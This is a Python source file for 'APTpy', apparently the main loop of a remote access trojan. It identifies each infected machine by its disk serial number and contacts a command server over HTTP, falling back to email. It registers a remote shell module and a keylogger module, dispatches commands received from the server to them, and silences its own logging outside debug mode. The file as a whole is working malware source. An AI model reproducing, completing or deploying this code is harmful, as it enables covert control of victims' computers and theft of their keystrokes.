import json
import logging
import logging.handlers
import Queue
from lib.channels.http import HttpChannel
from lib.channels.mail import MailChannel
from threading import Event
from time import sleep
from platform import system as platform_system
DEBUG = True


class APTpy:
    def __init__(self):
        self.platform = platform_system()
        self.client_id = None
        self.channel = None
        self.modules = []
        self.queue_send = Queue.Queue()
        self.queue_recv = Queue.Queue()
        self.events = {}

        # Used for debug only, you should hardcode those credentials to avoid external dependencies
        self.settings = {}

        # Logging information
        aptpy_logger = logging.getLogger('aptpy')
        aptpy_logger.setLevel(logging.DEBUG)

        # Create a rotation logging, so we won't have and endless file
        if DEBUG:
            rotate = logging.handlers.RotatingFileHandler('aptpy.log', maxBytes=(5 * 1024 * 1024), backupCount=3)
            rotate.setLevel(logging.DEBUG)
            rotate.setFormatter(logging.Formatter('%(asctime)s|%(levelname)-8s| %(message)s', '%Y-%m-%d %H:%M:%S'))

            aptpy_logger.addHandler(rotate)

            try:
                with open('settings.json', 'rb') as handle:
                    self.settings = json.load(handle)
            except IOError:
                pass

        console = logging.StreamHandler()
        console.setLevel(logging.DEBUG)

        console.setFormatter(logging.Formatter("%(asctime)s|%(levelname)-8s| %(message)s", '%Y-%m-%d %H:%M:%S'))
        aptpy_logger.addHandler(console)

        aptpy_logger.disabled = True

        if DEBUG:
            aptpy_logger.disabled = False

    def run(self):
        logger = logging.getLogger('aptpy')

        self._checkenv()

        logger.debug("[MAIN] Registering channels")
        self._registerChannels()

        if not self.channel:
            logger.debug("[MAIN] No channel available. Quitting.")
            return

        logger.debug("[MAIN] Registering modules")
        self._registerModules()

        logger.debug("[MAIN] Starting channel connection")
        self.channel.start()

        logger.debug("[MAIN] Starting all modules")
        for module in self.modules:
            module.start()

        try:
            logger.debug("[MAIN] Starting main loop")
            while True:
                sleep(0.5)

                if not self.queue_recv.empty():
                    cmd = self.queue_recv.get()

                    logger.info("[MAIN] Got command %s from the queue" % cmd)

                    self.queue_recv.task_done()

                    for module in self.modules:
                        if module.its_for_me(cmd):
                            className = module.__class__.__name__

                            logger.info("[MAIN] Module %s reclaimed the message" % className)

                            self.events[className].set()
                            self.events[className].clear()

        except BaseException as inner_e:
            logger.debug("[MAIN] Exception detected, try to stop all threads before bubbling up")

            self.channel.halt()
            self.channel.join()

            for module in self.modules:
                className = module.__class__.__name__
                module.halt()

                self.events[className].set()
                self.events[className].clear()

                module.join()

            raise inner_e

    def _checkenv(self):
        if self.platform == 'Darwin':
            import subprocess
            temp = subprocess.check_output(["ioreg -rd1 -w0 -c AppleAHCIDiskDriver | grep Serial"], shell=True)
            # '      "Serial Number" = "            XXXXXXXX"'
            temp = temp.strip().split('=')[1]
            disk = temp.replace('"', '').strip()
        elif self.platform == 'Windows':
            from wmi import WMI
            info = WMI()
            disk = info.Win32_PhysicalMedia()[0].SerialNumber.strip()
        else:
            raise Exception("OS not supported")

        logging.getLogger('aptpy').info("[MAIN] Client id: " + disk)
        self.client_id = disk

    def _registerChannels(self):
        self.channel = HttpChannel(self.client_id, self.queue_send, self.queue_recv, DEBUG)

        # If we can't contact the server, fallback to mail
        if not self.channel.enabled():
            self.channel = MailChannel(self.client_id, self.queue_send, self.queue_recv, DEBUG, self.settings)

            if not self.channel.enabled():
                self.channel = None

    def _registerModules(self):
        from lib.modules.shell import ShellModule

        self.events['ShellModule'] = Event()
        self.modules.append(ShellModule(self.queue_send, self.events['ShellModule']))

        if self.platform == 'win32':
            from lib.modules.keylogger import KeyloggerModule

            self.events['KeyloggerModule'] = Event()
            self.modules.append(KeyloggerModule(self.queue_send, self.events['KeyloggerModule']))
try:
    obj = APTpy()
    obj.run()
except BaseException as e:
    if DEBUG:
        print "[!] Operation aborted: " + str(type(e).__name__) + str(e.message)
